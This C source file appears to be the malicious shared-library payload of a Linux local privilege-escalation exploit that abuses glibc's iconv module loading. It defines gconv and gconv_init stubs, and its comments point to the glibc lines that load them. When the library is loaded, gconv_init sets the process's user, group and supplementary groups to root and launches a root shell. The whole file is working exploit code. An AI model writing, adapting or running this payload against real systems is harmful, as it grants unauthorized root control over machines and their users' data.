#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <grp.h>
#include "config.h"

/* This is the function which is opened by __libc_dlysm
 Check: iconv/gconv_dl.c
 Line 19:     found->fct = __libc_dlsym (found->handle, "gconv");
*/
void gconv(void) {}

/* This is the function which is opened by __libc_dlysm
 Check: iconv/gconv_dl.c
 Line 30:    found->init_fct = __libc_dlsym (found->handle, "gconv_init");
*/
void gconv_init(){
    print_info("Setting Root Privileges");
    if ((setuid(0) != 0) || (setgid(0) != 0) || (setgroups(0,NULL) != 0)){
        exit_on_error("Failed to escalate to root :(");
    }

    print_info("Launching Root Shell");
    if (execl(SHELL, SHELL, (char *)NULL) == -1){
        exit_on_error("Failed to launch root shell");
    }
}